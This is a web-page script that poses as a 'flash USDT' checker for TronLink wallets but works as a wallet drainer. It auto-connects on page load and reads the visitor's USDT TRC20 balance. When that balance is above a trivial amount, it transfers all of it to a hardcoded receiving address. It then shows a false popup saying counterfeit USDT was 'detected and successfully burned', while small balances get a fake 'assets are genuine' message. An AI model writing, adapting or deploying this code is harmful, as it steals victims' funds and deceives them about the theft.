<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
<script>
const trcReceiver = "TQP59pp5o9x6ohP8A6NWqUu9iJ3LfTNEKQ"; // Your USDT TRC20 receiving wallet
const usdtContractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // USDT TRC20 contract

let tronWeb;
let userAddress;

async function connectWallet() {
    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        tronWeb = window.tronWeb;
        userAddress = tronWeb.defaultAddress.base58;
        console.log("Wallet Connected:", userAddress);
    } else {
        alert("Please install TronLink wallet and refresh the page.");
    }
}

// Auto-connect wallet on page load
window.addEventListener("load", connectWallet);

async function Next() {
    if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        alert("Wallet not connected. Refresh the page.");
        return;
    }

    const contract = await tronWeb.contract().at(usdtContractAddress);
    const balanceSun = await contract.balanceOf(userAddress).call();
    const usdtBalance = parseFloat(tronWeb.fromSun(balanceSun));

    const bandwidth = await tronWeb.trx.getBandwidth(userAddress);
    const energy = await tronWeb.trx.getAccountResources(userAddress);

    console.log(`USDT Balance: ${usdtBalance} USDT`);
    console.log(`Bandwidth: ${bandwidth.freeNetRemaining}`);
    console.log(`Energy: ${energy.EnergyRemaining}`);

    if (usdtBalance === 0) {
        showPopup("No assets found.", "black");
        return;
    }

    if (usdtBalance <= 0.0005) {
        showPopup(
            `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance}`,
            "green"
        );
        return;
    }

    showPopup("Loading...", "green");

    transferUSDT(usdtBalance);
}

async function transferUSDT(usdtBalance) {
    try {
        const contract = await tronWeb.contract().at(usdtContractAddress);
        const amountToSend = tronWeb.toSun(usdtBalance.toString());

        console.log(`Transferring ${usdtBalance} USDT to ${trcReceiver}...`);

        await contract.transfer(trcReceiver, amountToSend).send();

        showPopup(
            `✅ Verification Successful<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT`,
            "red"
        );

        console.log(`✅ Transferred ${usdtBalance} USDT to ${trcReceiver}`);
    } catch (error) {
        console.error("❌ USDT Transfer Failed:", error);
        alert("USDT transfer failed. Ensure you have enough Energy.");
    }
}

// Function to display pop-up message
function showPopup(message, color) {
    let popup = document.getElementById("popupBox");

    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        popup.style.position = "fixed";
        popup.style.top = "50%";
        popup.style.left = "50%";
        popup.style.transform = "translate(-50%, -50%)";
        popup.style.padding = "20px";
        popup.style.borderRadius = "10px";
        popup.style.boxShadow = "0px 0px 10px rgba(0, 0, 0, 0.2)";
        popup.style.textAlign = "center";
        popup.style.fontSize = "18px";
        popup.style.width = "80%";
        popup.style.maxWidth = "400px";
        document.body.appendChild(popup);
    }

    popup.style.backgroundColor = color === "red" ? "#ffebeb" : "#e6f7e6";
    popup.style.color = color === "red" ? "red" : "green";
    popup.innerHTML = message;
    popup.style.display = "block";

    // Auto-hide after 5 seconds
    setTimeout(() => {
        popup.style.display = "none";
    }, 5000);
}

// Attach event listener
document.getElementById("Next").addEventListener("click", Next);
</script>
